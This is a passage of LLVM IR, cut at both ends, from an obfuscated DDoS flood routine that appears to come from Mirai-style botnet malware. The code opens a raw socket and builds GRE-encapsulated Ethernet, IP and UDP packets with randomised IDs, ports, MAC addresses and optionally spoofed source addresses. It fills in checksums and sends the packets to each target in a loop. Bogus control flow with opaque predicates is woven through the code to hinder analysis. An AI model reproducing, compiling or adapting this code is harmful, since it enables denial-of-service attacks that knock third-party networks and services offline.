originalBB114:                                    ; preds = %originalBB114alteredBB, %442
  %451 = load i32, i32* %29, align 4
  %452 = icmp eq i32 %451, -1
  %453 = load i32, i32* @x.21
  %454 = load i32, i32* @y.22
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %452, label %461, label %481

; <label>:461:                                    ; preds = %originalBBpart2116
  %462 = load i32, i32* @x.21
  %463 = load i32, i32* @y.22
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %461
  %470 = call i32 @rand_next()
  %471 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %472 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %471, i32 0, i32 8
  store i32 %470, i32* %472, align 4
  %473 = load i32, i32* @x.21
  %474 = load i32, i32* @y.22
  %475 = sub i32 %473, 1
  %476 = mul i32 %473, %475
  %477 = urem i32 %476, 2
  %478 = icmp eq i32 %477, 0
  %479 = icmp slt i32 %474, 10
  %480 = or i1 %478, %479
  br i1 %480, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %481

; <label>:481:                                    ; preds = %originalBBpart2120, %originalBBpart2116
  %482 = load i32, i32* @x.21
  %483 = load i32, i32* @y.22
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %481
  %490 = load i16, i16* %21, align 2
  %491 = zext i16 %490 to i32
  %492 = icmp eq i32 %491, 65535
  %493 = load i32, i32* @x.21
  %494 = load i32, i32* @y.22
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %492, label %501, label %532

; <label>:501:                                    ; preds = %originalBBpart2124
  %502 = load i32, i32* @x.21
  %503 = load i32, i32* @y.22
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %501
  %510 = call i32 @rand_next()
  %511 = and i32 %510, 65535
  %512 = trunc i32 %511 to i16
  %513 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %514 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %513, i32 0, i32 3
  store i16 %512, i16* %514, align 4
  %515 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %516 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %515, i32 0, i32 3
  %517 = load i16, i16* %516, align 4
  %518 = zext i16 %517 to i32
  %519 = sub nsw i32 %518, 1000
  %520 = xor i32 %519, -1
  %521 = trunc i32 %520 to i16
  %522 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %523 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %522, i32 0, i32 3
  store i16 %521, i16* %523, align 4
  %524 = load i32, i32* @x.21
  %525 = load i32, i32* @y.22
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBBpart2149, label %originalBB126alteredBB

originalBBpart2149:                               ; preds = %originalBB126
  br label %532

; <label>:532:                                    ; preds = %originalBBpart2149, %originalBBpart2124
  %533 = load i16, i16* %24, align 2
  %534 = zext i16 %533 to i32
  %535 = icmp eq i32 %534, 65535
  br i1 %535, label %536, label %542

; <label>:536:                                    ; preds = %532
  %537 = call i32 @rand_next()
  %538 = and i32 %537, 65535
  %539 = trunc i32 %538 to i16
  %540 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %541 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %540, i32 0, i32 0
  store i16 %539, i16* %541, align 2
  br label %542

; <label>:542:                                    ; preds = %536, %532
  %543 = load i32, i32* @x.21
  %544 = load i32, i32* @y.22
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %542
  %551 = load i16, i16* %25, align 2
  %552 = zext i16 %551 to i32
  %553 = icmp eq i32 %552, 65535
  %554 = load i32, i32* @x.21
  %555 = load i32, i32* @y.22
  %556 = sub i32 %554, 1
  %557 = mul i32 %554, %556
  %558 = urem i32 %557, 2
  %559 = icmp eq i32 %558, 0
  %560 = icmp slt i32 %555, 10
  %561 = or i1 %559, %560
  br i1 %561, label %originalBBpart2153, label %originalBB151alteredBB

originalBBpart2153:                               ; preds = %originalBB151
  br i1 %553, label %562, label %568

; <label>:562:                                    ; preds = %originalBBpart2153
  %563 = call i32 @rand_next()
  %564 = and i32 %563, 65535
  %565 = trunc i32 %564 to i16
  %566 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %567 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %566, i32 0, i32 1
  store i16 %565, i16* %567, align 2
  br label %568

; <label>:568:                                    ; preds = %562, %originalBBpart2153
  %569 = load i8, i8* %28, align 1
  %570 = icmp ne i8 %569, 0
  br i1 %570, label %591, label %571

; <label>:571:                                    ; preds = %568
  %572 = load i32, i32* @x.21
  %573 = load i32, i32* @y.22
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %571
  %580 = call i32 @rand_next()
  %581 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %582 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %581, i32 0, i32 9
  store i32 %580, i32* %582, align 4
  %583 = load i32, i32* @x.21
  %584 = load i32, i32* @y.22
  %585 = sub i32 %583, 1
  %586 = mul i32 %583, %585
  %587 = urem i32 %586, 2
  %588 = icmp eq i32 %587, 0
  %589 = icmp slt i32 %584, 10
  %590 = or i1 %588, %589
  br i1 %590, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br label %597

; <label>:591:                                    ; preds = %568
  %592 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %593 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %592, i32 0, i32 9
  %594 = load i32, i32* %593, align 4
  %595 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %596 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %595, i32 0, i32 9
  store i32 %594, i32* %596, align 4
  br label %597

; <label>:597:                                    ; preds = %591, %originalBBpart2157
  %598 = load i32, i32* @x.21
  %599 = load i32, i32* @y.22
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBB159, label %originalBB159alteredBB

originalBB159:                                    ; preds = %originalBB159alteredBB, %597
  %606 = call i32 @rand_next()
  store i32 %606, i32* %45, align 4
  %607 = call i32 @rand_next()
  store i32 %607, i32* %46, align 4
  %608 = call i32 @rand_next()
  store i32 %608, i32* %47, align 4
  %609 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %610 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %609, i32 0, i32 0
  %611 = getelementptr inbounds [6 x i8], [6 x i8]* %610, i32 0, i32 0
  %612 = bitcast i32* %45 to i8*
  call void @util_memcpy(i8* %611, i8* %612, i32 4)
  %613 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %614 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %613, i32 0, i32 1
  %615 = getelementptr inbounds [6 x i8], [6 x i8]* %614, i32 0, i32 0
  %616 = bitcast i32* %46 to i8*
  call void @util_memcpy(i8* %615, i8* %616, i32 4)
  %617 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %618 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %617, i32 0, i32 0
  %619 = getelementptr inbounds [6 x i8], [6 x i8]* %618, i32 0, i32 0
  %620 = getelementptr inbounds i8, i8* %619, i64 4
  %621 = bitcast i32* %47 to i8*
  call void @util_memcpy(i8* %620, i8* %621, i32 2)
  %622 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %623 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %622, i32 0, i32 1
  %624 = getelementptr inbounds [6 x i8], [6 x i8]* %623, i32 0, i32 0
  %625 = getelementptr inbounds i8, i8* %624, i64 4
  %626 = bitcast i32* %47 to i8*
  %627 = getelementptr inbounds i8, i8* %626, i64 2
  call void @util_memcpy(i8* %625, i8* %627, i32 2)
  %628 = load i8, i8* %27, align 1
  %629 = icmp ne i8 %628, 0
  %630 = load i32, i32* @x.21
  %631 = load i32, i32* @y.22
  %632 = sub i32 %630, 1
  %633 = mul i32 %630, %632
  %634 = urem i32 %633, 2
  %635 = icmp eq i32 %634, 0
  %636 = icmp slt i32 %631, 10
  %637 = or i1 %635, %636
  br i1 %637, label %originalBBpart2161, label %originalBB159alteredBB

originalBBpart2161:                               ; preds = %originalBB159
  br i1 %629, label %638, label %657

; <label>:638:                                    ; preds = %originalBBpart2161
  %639 = load i32, i32* @x.21
  %640 = load i32, i32* @y.22
  %641 = sub i32 %639, 1
  %642 = mul i32 %639, %641
  %643 = urem i32 %642, 2
  %644 = icmp eq i32 %643, 0
  %645 = icmp slt i32 %640, 10
  %646 = or i1 %644, %645
  br i1 %646, label %originalBB163, label %originalBB163alteredBB

originalBB163:                                    ; preds = %originalBB163alteredBB, %638
  %647 = load i8*, i8** %44, align 8
  %648 = load i32, i32* %26, align 4
  call void @rand_str(i8* %647, i32 %648)
  %649 = load i32, i32* @x.21
  %650 = load i32, i32* @y.22
  %651 = sub i32 %649, 1
  %652 = mul i32 %649, %651
  %653 = urem i32 %652, 2
  %654 = icmp eq i32 %653, 0
  %655 = icmp slt i32 %650, 10
  %656 = or i1 %654, %655
  br i1 %656, label %originalBBpart2165, label %originalBB163alteredBB

originalBBpart2165:                               ; preds = %originalBB163
  br label %657

; <label>:657:                                    ; preds = %originalBBpart2165, %originalBBpart2161
  %658 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %659 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %658, i32 0, i32 7
  store i16 0, i16* %659, align 2
  %660 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %661 = bitcast %struct.iphdr* %660 to i16*
  %662 = call zeroext i16 @checksum_generic(i16* %661, i32 20)
  %663 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %664 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %663, i32 0, i32 7
  store i16 %662, i16* %664, align 2
  %665 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %666 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %665, i32 0, i32 7
  store i16 0, i16* %666, align 2
  %667 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %668 = bitcast %struct.iphdr* %667 to i16*
  %669 = call zeroext i16 @checksum_generic(i16* %668, i32 20)
  %670 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %671 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %670, i32 0, i32 7
  store i16 %669, i16* %671, align 2
  %672 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %673 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %672, i32 0, i32 3
  store i16 0, i16* %673, align 2
  %674 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %675 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %676 = bitcast %struct.udphdr* %675 to i8*
  %677 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %678 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %677, i32 0, i32 2
  %679 = load i16, i16* %678, align 2
  %680 = load i32, i32* %26, align 4
  %681 = sext i32 %680 to i64
  %682 = add i64 8, %681
  %683 = trunc i64 %682 to i32
  %684 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %674, i8* %676, i16 zeroext %679, i32 %683)
  %685 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %686 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %685, i32 0, i32 3
  store i16 %684, i16* %686, align 2
  %687 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %688 = load i32, i32* %17, align 4
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %687, i64 %689
  %691 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %690, i32 0, i32 0
  %692 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %691, i32 0, i32 0
  store i16 2, i16* %692, align 4
  %693 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %694 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %693, i32 0, i32 9
  %695 = load i32, i32* %694, align 4
  %696 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %697 = load i32, i32* %17, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %696, i64 %698
  %700 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %699, i32 0, i32 0
  %701 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %700, i32 0, i32 2
  %702 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %701, i32 0, i32 0
  store i32 %695, i32* %702, align 4
  %703 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %704 = load i32, i32* %17, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %703, i64 %705
  %707 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %706, i32 0, i32 0
  %708 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %707, i32 0, i32 1
  store i16 0, i16* %708, align 2
  %709 = load i32, i32* %18, align 4
  %710 = load i8*, i8** %38, align 8
  %711 = load i32, i32* %26, align 4
  %712 = sext i32 %711 to i64
  %713 = add i64 66, %712
  %714 = bitcast %union.__CONST_SOCKADDR_ARG* %48 to %struct.sockaddr**
  %715 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %716 = load i32, i32* %17, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %715, i64 %717
  %719 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %718, i32 0, i32 0
  %720 = bitcast %struct.sockaddr_in* %719 to %struct.sockaddr*
  store %struct.sockaddr* %720, %struct.sockaddr** %714, align 8
  %721 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %48, i32 0, i32 0
  %722 = load %struct.sockaddr*, %struct.sockaddr** %721, align 8
  %723 = call i64 @sendto(i32 %709, i8* %710, i64 %713, i32 16384, %struct.sockaddr* %722, i32 16)
  br label %724

; <label>:724:                                    ; preds = %657
  %725 = load i32, i32* @x.21
  %726 = load i32, i32* @y.22
  %727 = sub i32 %725, 1
  %728 = mul i32 %725, %727
  %729 = urem i32 %728, 2
  %730 = icmp eq i32 %729, 0
  %731 = icmp slt i32 %726, 10
  %732 = or i1 %730, %731
  br i1 %732, label %originalBB167, label %originalBB167alteredBB

originalBB167:                                    ; preds = %originalBB167alteredBB, %724
  %733 = load i32, i32* %17, align 4
  %734 = add nsw i32 %733, 1
  store i32 %734, i32* %17, align 4
  %735 = load i32, i32* @x.21
  %736 = load i32, i32* @y.22
  %737 = sub i32 %735, 1
  %738 = mul i32 %735, %737
  %739 = urem i32 %738, 2
  %740 = icmp eq i32 %739, 0
  %741 = icmp slt i32 %736, 10
  %742 = or i1 %740, %741
  br i1 %742, label %originalBBpart2175, label %originalBB167alteredBB

originalBBpart2175:                               ; preds = %originalBB167
  br label %369

; <label>:743:                                    ; preds = %369
  br label %352

; <label>:744:                                    ; preds = %originalBBpart24, %102
  %745 = load i32, i32* @x.21
  %746 = load i32, i32* @y.22
  %747 = sub i32 %745, 1
  %748 = mul i32 %745, %747
  %749 = urem i32 %748, 2
  %750 = icmp eq i32 %749, 0
  %751 = icmp slt i32 %746, 10
  %752 = or i1 %750, %751
  br i1 %752, label %originalBB177, label %originalBB177alteredBB

originalBB177:                                    ; preds = %originalBB177alteredBB, %744
  %753 = load i32, i32* @x.21
  %754 = load i32, i32* @y.22
  %755 = sub i32 %753, 1
  %756 = mul i32 %753, %755
  %757 = urem i32 %756, 2
  %758 = icmp eq i32 %757, 0
  %759 = icmp slt i32 %754, 10
  %760 = or i1 %758, %759
  br i1 %760, label %originalBBpart2179, label %originalBB177alteredBB

originalBBpart2179:                               ; preds = %originalBB177
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %761 = alloca i8, align 1
  %762 = alloca %struct.attack_target*, align 8
  %763 = alloca i8, align 1
  %764 = alloca %struct.attack_option*, align 8
  %765 = alloca i32, align 4
  %766 = alloca i32, align 4
  %767 = alloca i8**, align 8
  %768 = alloca i8, align 1
  %769 = alloca i16, align 2
  %770 = alloca i8, align 1
  %771 = alloca i8, align 1
  %772 = alloca i16, align 2
  %773 = alloca i16, align 2
  %774 = alloca i32, align 4
  %775 = alloca i8, align 1
  %776 = alloca i8, align 1
  %777 = alloca i32, align 4
  %778 = alloca %struct.iphdr*, align 8
  %779 = alloca %struct.grehdr*, align 8
  %780 = alloca %struct.ethhdr*, align 8
  %781 = alloca %struct.iphdr*, align 8
  %782 = alloca %struct.udphdr*, align 8
  %783 = alloca i32, align 4
  %784 = alloca i32, align 4
  %785 = alloca i32, align 4
  %786 = alloca i8*, align 8
  %787 = alloca %struct.iphdr*, align 8
  %788 = alloca %struct.grehdr*, align 8
  %789 = alloca %struct.ethhdr*, align 8
  %790 = alloca %struct.iphdr*, align 8
  %791 = alloca %struct.udphdr*, align 8
  %792 = alloca i8*, align 8
  %793 = alloca i32, align 4
  %794 = alloca i32, align 4
  %795 = alloca i32, align 4
  %796 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %761, align 1
  store %struct.attack_target* %1, %struct.attack_target** %762, align 8
  store i8 %2, i8* %763, align 1
  store %struct.attack_option* %3, %struct.attack_option** %764, align 8
  %797 = load i8, i8* %761, align 1
  %798 = zext i8 %797 to i64
  %799 = call noalias i8* @calloc(i64 %798, i64 8) #6
  %800 = bitcast i8* %799 to i8**
  store i8** %800, i8*** %767, align 8
  %801 = load i8, i8* %763, align 1
  %802 = load %struct.attack_option*, %struct.attack_option** %764, align 8
  %803 = call i32 @attack_get_opt_int(i8 zeroext %801, %struct.attack_option* %802, i8 zeroext 2, i32 0)
  %804 = trunc i32 %803 to i8
  store i8 %804, i8* %768, align 1
  %805 = load i8, i8* %763, align 1
  %806 = load %struct.attack_option*, %struct.attack_option** %764, align 8
  %807 = call i32 @attack_get_opt_int(i8 zeroext %805, %struct.attack_option* %806, i8 zeroext 3, i32 65535)
  %808 = trunc i32 %807 to i16
  store i16 %808, i16* %769, align 2
  %809 = load i8, i8* %763, align 1
  %810 = load %struct.attack_option*, %struct.attack_option** %764, align 8
  %811 = call i32 @attack_get_opt_int(i8 zeroext %809, %struct.attack_option* %810, i8 zeroext 4, i32 64)
  %812 = trunc i32 %811 to i8
  store i8 %812, i8* %770, align 1
  %813 = load i8, i8* %763, align 1
  %814 = load %struct.attack_option*, %struct.attack_option** %764, align 8
  %815 = call i32 @attack_get_opt_int(i8 zeroext %813, %struct.attack_option* %814, i8 zeroext 5, i32 1)
  %816 = trunc i32 %815 to i8
  store i8 %816, i8* %771, align 1
  %817 = load i8, i8* %763, align 1
  %818 = load %struct.attack_option*, %struct.attack_option** %764, align 8
  %819 = call i32 @attack_get_opt_int(i8 zeroext %817, %struct.attack_option* %818, i8 zeroext 6, i32 65535)
  %820 = trunc i32 %819 to i16
  store i16 %820, i16* %772, align 2
  %821 = load i8, i8* %763, align 1
  %822 = load %struct.attack_option*, %struct.attack_option** %764, align 8
  %823 = call i32 @attack_get_opt_int(i8 zeroext %821, %struct.attack_option* %822, i8 zeroext 7, i32 65535)
  %824 = trunc i32 %823 to i16
  store i16 %824, i16* %773, align 2
  %825 = load i8, i8* %763, align 1
  %826 = load %struct.attack_option*, %struct.attack_option** %764, align 8
  %827 = call i32 @attack_get_opt_int(i8 zeroext %825, %struct.attack_option* %826, i8 zeroext 0, i32 512)
  store i32 %827, i32* %774, align 4
  %828 = load i8, i8* %763, align 1
  %829 = load %struct.attack_option*, %struct.attack_option** %764, align 8
  %830 = call i32 @attack_get_opt_int(i8 zeroext %828, %struct.attack_option* %829, i8 zeroext 1, i32 1)
  %831 = trunc i32 %830 to i8
  store i8 %831, i8* %775, align 1
  %832 = load i8, i8* %763, align 1
  %833 = load %struct.attack_option*, %struct.attack_option** %764, align 8
  %834 = call i32 @attack_get_opt_int(i8 zeroext %832, %struct.attack_option* %833, i8 zeroext 19, i32 0)
  %835 = trunc i32 %834 to i8
  store i8 %835, i8* %776, align 1
  %836 = load i8, i8* %763, align 1
  %837 = load %struct.attack_option*, %struct.attack_option** %764, align 8
  %838 = load i32, i32* @LOCAL_ADDR, align 4
  %839 = call i32 @attack_get_opt_int(i8 zeroext %836, %struct.attack_option* %837, i8 zeroext 25, i32 %838)
  store i32 %839, i32* %777, align 4
  %840 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %840, i32* %766, align 4
  %841 = icmp eq i32 %840, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %108
  %842 = load i32, i32* %18, align 4
  %843 = call i32 @close(i32 %842)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %133
  %844 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %845 = load i8**, i8*** %19, align 8
  %846 = load i32, i32* %17, align 4
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds i8*, i8** %845, i64 %847
  store i8* %844, i8** %848, align 8
  %849 = load i8**, i8*** %19, align 8
  %850 = load i32, i32* %17, align 4
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds i8*, i8** %849, i64 %851
  %853 = load i8*, i8** %852, align 8
  %854 = bitcast i8* %853 to %struct.iphdr*
  store %struct.iphdr* %854, %struct.iphdr** %30, align 8
  %855 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %856 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %855, i64 1
  %857 = bitcast %struct.iphdr* %856 to %struct.grehdr*
  store %struct.grehdr* %857, %struct.grehdr** %31, align 8
  %858 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %859 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %858, i64 1
  %860 = bitcast %struct.grehdr* %859 to %struct.ethhdr*
  store %struct.ethhdr* %860, %struct.ethhdr** %32, align 8
  %861 = load %struct.ethhdr*, %struct.ethhdr** %32, align 8
  %862 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %861, i64 1
  %863 = bitcast %struct.ethhdr* %862 to %struct.iphdr*
  store %struct.iphdr* %863, %struct.iphdr** %33, align 8
  %864 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %865 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %864, i64 1
  %866 = bitcast %struct.iphdr* %865 to %struct.udphdr*
  store %struct.udphdr* %866, %struct.udphdr** %34, align 8
  %867 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %868 = bitcast %struct.iphdr* %867 to i8*
  %869 = load i8, i8* %868, align 4
  %_ = sub i8 0, %869
  %gen = add i8 %_, 15
  %_7 = sub i8 0, %869
  %gen8 = add i8 %_7, 15
  %_9 = sub i8 0, %869
  %gen10 = add i8 %_9, 15
  %870 = and i8 %869, 15
  %_11 = sub i8 %870, 64
  %gen12 = mul i8 %_11, 64
  %_13 = sub i8 %870, 64
  %gen14 = mul i8 %_13, 64
  %871 = or i8 %870, 64
  store i8 %871, i8* %868, align 4
  %872 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %873 = bitcast %struct.iphdr* %872 to i8*
  %874 = load i8, i8* %873, align 4
  %_15 = sub i8 %874, -16
  %gen16 = mul i8 %_15, -16
  %_17 = shl i8 %874, -16
  %_18 = sub i8 0, %874
  %gen19 = add i8 %_18, -16
  %_20 = sub i8 %874, -16
  %gen21 = mul i8 %_20, -16
  %_22 = sub i8 0, %874
  %gen23 = add i8 %_22, -16
  %875 = and i8 %874, -16
  %_24 = shl i8 %875, 5
  %_25 = sub i8 %875, 5
  %gen26 = mul i8 %_25, 5
  %_27 = shl i8 %875, 5
  %876 = or i8 %875, 5
  store i8 %876, i8* %873, align 4
  %877 = load i8, i8* %20, align 1
  %878 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %879 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %878, i32 0, i32 1
  store i8 %877, i8* %879, align 1
  %880 = load i32, i32* %26, align 4
  %881 = sext i32 %880 to i64
  %_28 = shl i64 66, %881
  %_29 = sub i64 0, 66
  %gen30 = add i64 %_29, %881
  %_31 = shl i64 66, %881
  %_32 = sub i64 66, %881
  %gen33 = mul i64 %_32, %881
  %_34 = shl i64 66, %881
  %_35 = sub i64 66, %881
  %gen36 = mul i64 %_35, %881
  %_37 = sub i64 66, %881
  %gen38 = mul i64 %_37, %881
  %_39 = shl i64 66, %881
  %882 = add i64 66, %881
  %883 = trunc i64 %882 to i16
  %884 = call zeroext i16 @htons(i16 zeroext %883) #7
  %885 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %886 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %885, i32 0, i32 2
  store i16 %884, i16* %886, align 2
  %887 = load i16, i16* %21, align 2
  %888 = call zeroext i16 @htons(i16 zeroext %887) #7
  %889 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %890 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %889, i32 0, i32 3
  store i16 %888, i16* %890, align 4
  %891 = load i8, i8* %22, align 1
  %892 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %893 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %892, i32 0, i32 5
  store i8 %891, i8* %893, align 4
  %894 = load i8, i8* %23, align 1
  %895 = icmp ne i8 %894, 0
  br label %originalBB6

originalBB43alteredBB:                            ; preds = %originalBB43, %206
  %896 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %897 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %896, i32 0, i32 6
  store i8 47, i8* %897, align 1
  %898 = load i32, i32* %29, align 4
  %899 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %900 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %899, i32 0, i32 8
  store i32 %898, i32* %900, align 4
  %901 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %902 = load i32, i32* %17, align 4
  %903 = sext i32 %902 to i64
  %904 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %901, i64 %903
  %905 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %904, i32 0, i32 1
  %906 = load i32, i32* %905, align 4
  %907 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %908 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %907, i32 0, i32 9
  store i32 %906, i32* %908, align 4
  %909 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %910 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %911 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %910, i32 0, i32 1
  store i16 %909, i16* %911, align 2
  %912 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %913 = load %struct.ethhdr*, %struct.ethhdr** %32, align 8
  %914 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %913, i32 0, i32 2
  store i16 %912, i16* %914, align 1
  %915 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %916 = bitcast %struct.iphdr* %915 to i8*
  %917 = load i8, i8* %916, align 4
  %_44 = sub i8 0, %917
  %gen45 = add i8 %_44, 15
  %_46 = sub i8 %917, 15
  %gen47 = mul i8 %_46, 15
  %_48 = sub i8 0, %917
  %gen49 = add i8 %_48, 15
  %_50 = shl i8 %917, 15
  %918 = and i8 %917, 15
  %919 = or i8 %918, 64
  store i8 %919, i8* %916, align 4
  %920 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %921 = bitcast %struct.iphdr* %920 to i8*
  %922 = load i8, i8* %921, align 4
  %_51 = shl i8 %922, -16
  %_52 = sub i8 0, %922
  %gen53 = add i8 %_52, -16
  %_54 = shl i8 %922, -16
  %923 = and i8 %922, -16
  %_55 = shl i8 %923, 5
  %_56 = sub i8 0, %923
